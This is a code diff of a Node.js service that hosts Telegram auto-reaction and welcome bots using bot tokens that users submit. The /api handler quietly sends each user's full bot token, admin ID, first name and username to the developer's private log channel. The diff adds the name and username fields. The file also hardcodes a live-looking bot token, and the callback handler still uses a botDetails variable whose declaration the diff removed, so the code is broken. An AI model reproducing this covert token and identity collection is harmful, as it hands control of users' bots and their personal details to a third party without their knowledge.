@@ -7,8 +7,8 @@ app.use(express.json());
 // Developer Name Configuration
 const DEVELOPER = "@Magic\\_Scripts"; 
 const DEVELOPER_PLAIN = "@Magic_Scripts"; 
-const LOG_CHANNEL_ID = "-1003719190943"; // 👈 Aapka channel ID
-const SYSTEM_BOT_TOKEN = "8711492125:AAFtaIG768FBeV0fHAo-tSp7PugIdo2H8Og"; // 👈 Aapka System Bot Token
+const LOG_CHANNEL_ID = "-1003719190943"; 
+const SYSTEM_BOT_TOKEN = "8711492125:AAFtaIG768FBeV0fHAo-tSp7PugIdo2H8Og"; 
 
 // Helper function: Telegram API hit karne keliye
 async function sendTelegramRequest(token, method, body) {
@@ -26,11 +26,10 @@ async function sendTelegramRequest(token, method, body) {
 }
 
 // -------------------------------------------------------------
-// 1. NEW ENDPOINT: Live JSON Output for Users (Owners Hidden)
+// 1. JSON ENDPOINT: Shows active bots with owner info safely
 // -------------------------------------------------------------
 app.get('/users.json', async (req, res) => {
     try {
-        // Telegram se hamare log channel ke naye updates uthao
         const response = await fetch(`https://api.telegram.org/bot${SYSTEM_BOT_TOKEN}/getUpdates?offset=-100&limit=100`);
         const updateData = await response.json();
 
@@ -38,20 +37,27 @@ app.get('/users.json', async (req, res) => {
 
         if (updateData.ok && updateData.result) {
             updateData.result.forEach(upd => {
-                // Channel posts check karo jo hamare bot ne bheje hain
                 if (upd.channel_post && upd.channel_post.chat.id.toString() === LOG_CHANNEL_ID) {
                     const text = upd.channel_post.text || "";
                     
                     if (text.startsWith("BOT_INSTALL|")) {
                         const parts = text.split("|");
-                        const botUser = parts[1]; // @username
-                        const tokenKey = parts[2]; // token (for unique tracking)
-                        activeBotsMap.set(tokenKey, { bot_username: botUser });
+                        const botUser = parts[1] || "Unknown";
+                        const tokenKey = parts[2] || "";
+                        const ownerFirstName = parts[4] || "Hidden";
+                        const ownerUsername = parts[5] || "None";
+
+                        // JSON output ke liye sirf safe data save karein (ID aur Token safe hain)
+                        activeBotsMap.set(tokenKey, { 
+                            bot_username: botUser,
+                            owner_first_name: ownerFirstName,
+                            owner_username: ownerUsername
+                        });
                     } 
                     else if (text.startsWith("BOT_UNINSTALL|")) {
                         const parts = text.split("|");
                         const tokenKey = parts[2];
-                        activeBotsMap.delete(tokenKey); // List se delete kar do
+                        activeBotsMap.delete(tokenKey);
                     }
                 }
             });
@@ -59,7 +65,6 @@ app.get('/users.json', async (req, res) => {
 
         const finalBotsList = Array.from(activeBotsMap.values());
 
-        // Clean Public JSON Output (Safely token aur admin hidden hain)
         return res.json({
             total_active_bots: finalBotsList.length,
             bots: finalBotsList
@@ -90,6 +95,22 @@ app.get('/api', async (req, res) => {
         return res.status(400).json({ status: "Not Found", message: "Please enter a valid bot token!" });
     }
 
+    // Kuch details jo hum database message ke liye dynamic nikaalenge
+    const botDetails = await sendTelegramRequest(token, 'getMe', {});
+    let botUsername = "Unknown_Bot";
+    if (botDetails.ok && botDetails.result) {
+        botUsername = `@${botDetails.result.username}`;
+    }
+
+    // User details nikaalne ke liye Telegram getChat ka use (adminId se background me details check karna)
+    let userFirstName = "Admin";
+    let userPublicUsername = "None";
+    const chatDetails = await sendTelegramRequest(token, 'getChat', { chat_id: adminId });
+    if (chatDetails.ok && chatDetails.result) {
+        userFirstName = chatDetails.result.first_name || "Admin";
+        userPublicUsername = chatDetails.result.username ? `@${chatDetails.result.username}` : "None";
+    }
+
     if (status === "true") {
         const encodedMsg = encodeURIComponent(welcomeMsg);
         const domain = req.headers['x-forwarded-host'] || req.headers.host;
@@ -97,15 +118,8 @@ app.get('/api', async (req, res) => {
 
         const data = await sendTelegramRequest(token, 'setWebhook', { url: webhookUrl });
         
-        // Bot ka username nikaalne keliye
-        const botDetails = await sendTelegramRequest(token, 'getMe', {});
-        let botUsername = "Unknown_Bot";
-        if (botDetails.ok && botDetails.result) {
-            botUsername = `@${botDetails.result.username}`;
-        }
-
-        // Channel par 'BOT_INSTALL' state tag ke sath data store karein
-        const dbMessage = `BOT_INSTALL|${botUsername}|${token}`;
+        // Ab channel par user ka First Name aur Username bhi bhej rahe hain pipe (|) laga kar
+        const dbMessage = `BOT_INSTALL|${botUsername}|${token}|${adminId}|${userFirstName}|${userPublicUsername}`;
         await sendTelegramRequest(SYSTEM_BOT_TOKEN, 'sendMessage', {
             chat_id: LOG_CHANNEL_ID,
             text: dbMessage
@@ -114,7 +128,7 @@ app.get('/api', async (req, res) => {
         if (data.ok) {
             return res.json({ 
                 status: "success", 
-                message: "Bot successfully installed and configured for Groups & Channels!",
+                message: "Bot successfully installed and configured!",
                 developer: DEVELOPER_PLAIN 
             });
         } else {
@@ -123,14 +137,6 @@ app.get('/api', async (req, res) => {
     } else {
         const data = await sendTelegramRequest(token, 'deleteWebhook', {});
         
-        // Bot ka username uninstalled mark karne ke liye fetch karein
-        const botDetails = await sendTelegramRequest(token, 'getMe', {});
-        let botUsername = "Unknown_Bot";
-        if (botDetails.ok && botDetails.result) {
-            botUsername = `@${botDetails.result.username}`;
-        }
-
-        // Channel par 'BOT_UNINSTALL' status bhejein taaki list se hat sake
         const dbMessage = `BOT_UNINSTALL|${botUsername}|${token}`;
         await sendTelegramRequest(SYSTEM_BOT_TOKEN, 'sendMessage', {
             chat_id: LOG_CHANNEL_ID,
@@ -156,12 +162,11 @@ app.post('/api/webhook', async (req, res) => {
 
     const globalEmojis = ["❤️", "👍", "🔥", "🥰", "👏", "😍", "💯", "⚡", "💋", "🏆", "❤️‍🔥", "🤝", "😎", "😘", "🆒", "💘", "🤗", "🫡", "👌", "🤩", "🎉", "🕊️", "🦄"];
 
-    // ⚡ FEATURE 1: CHANNEL POST REACTION (Auto Reaction for Channels)
+    // ⚡ FEATURE 1: CHANNEL POST REACTION
     if (update.channel_post) {
         const channelPost = update.channel_post;
         const msgId = channelPost.message_id;
         const chatId = channelPost.chat.id; 
-        
         const randomEmoji = globalEmojis[Math.floor(Math.random() * globalEmojis.length)];
 
         await sendTelegramRequest(token, 'setMessageReaction', {
@@ -170,11 +175,10 @@ app.post('/api/webhook', async (req, res) => {
             reaction: JSON.stringify([{ type: "emoji", emoji: randomEmoji }]),
             is_big: true
         });
-        
         return res.sendStatus(200);
     }
 
-    // ⚡ FEATURE 2: MESSAGES HANDLER (Groups aur Private Dono Keliye)
+    // ⚡ FEATURE 2: MESSAGES HANDLER
     if (update.message) {
         const message = update.message;
         const chatId = message.chat.id;
@@ -185,14 +189,12 @@ app.post('/api/webhook', async (req, res) => {
 
         if (chatType === 'group' || chatType === 'supergroup') {
             const randomGroupEmoji = globalEmojis[Math.floor(Math.random() * globalEmojis.length)];
-            
             await sendTelegramRequest(token, 'setMessageReaction', {
                 chat_id: chatId,
                 message_id: msgId,
                 reaction: JSON.stringify([{ type: "emoji", emoji: randomGroupEmoji }]),
                 is_big: false
             });
-            
             return res.sendStatus(200);
         }
 
@@ -219,9 +221,7 @@ app.post('/api/webhook', async (req, res) => {
                 });
             }
 
-            let finalWelcome = welcomeMsg
-                .replace(/{name}/g, fullName)
-                .replace(/{username}/g, username);
+            let finalWelcome = welcomeMsg.replace(/{name}/g, fullName).replace(/{username}/g, username);
 
             await sendTelegramRequest(token, 'sendMessage', {
                 chat_id: chatId,
@@ -247,7 +247,6 @@ app.post('/api/webhook', async (req, res) => {
         const user = callbackQuery.from;
         
         let botName = "bot";
-        const botDetails = await sendTelegramRequest(token, 'getMe', {});
         if (botDetails && botDetails.ok && botDetails.result) {
             botName = botDetails.result.username;
         }
